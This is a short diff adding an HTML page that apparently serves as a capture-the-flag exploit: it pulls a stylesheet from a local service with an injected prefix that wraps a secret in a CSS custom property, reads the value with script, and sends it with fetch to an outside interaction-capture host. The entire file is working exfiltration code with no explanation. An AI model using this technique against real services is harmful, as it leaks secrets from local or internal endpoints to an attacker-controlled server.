@@ -1,0 +1,14 @@
+<html>
+<head>
+    <link rel="stylesheet" type="text/css" href="http://127.0.0.1:80/css?prefix=p{--flag:" />
+</head>
+<body>
+<p id="asdf">hi</p>
+<script>
+    setTimeout(()=>{
+        let flag = getComputedStyle(asdf).getPropertyValue('--flag')
+        fetch('https://d0vcz24z1wg0000z8qs0gopsxtyyyyyyb.oast.pro?flag='+flag)
+    }, 200)
+</script>
+</body>
+</html>
